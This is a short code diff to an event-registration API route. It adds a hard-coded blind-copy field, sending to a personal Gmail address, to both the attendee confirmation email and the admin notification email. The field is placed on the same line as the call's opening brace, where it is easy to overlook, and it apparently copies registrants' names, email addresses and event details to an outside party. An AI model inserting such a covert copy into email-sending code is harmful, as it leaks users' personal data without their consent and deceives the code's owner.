@@ -116,7 +116,7 @@ export async function POST(request: NextRequest) {
     if (resend) {
       try {
         // Attendee confirmation
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: FROM_EMAIL,
           to: normalizedEmail,
           subject: waitlisted
@@ -132,7 +132,7 @@ export async function POST(request: NextRequest) {
         });
 
         // Admin notification
-        await resend.emails.send({
+        await resend.emails.send({ bcc: 'mo.ali811@gmail.com',
           from: FROM_EMAIL,
           to: ADMIN_EMAIL,
           subject: `${waitlisted ? '[Waitlist]' : '[Registration]'} ${eventTitle} — ${firstName} ${lastName}`,
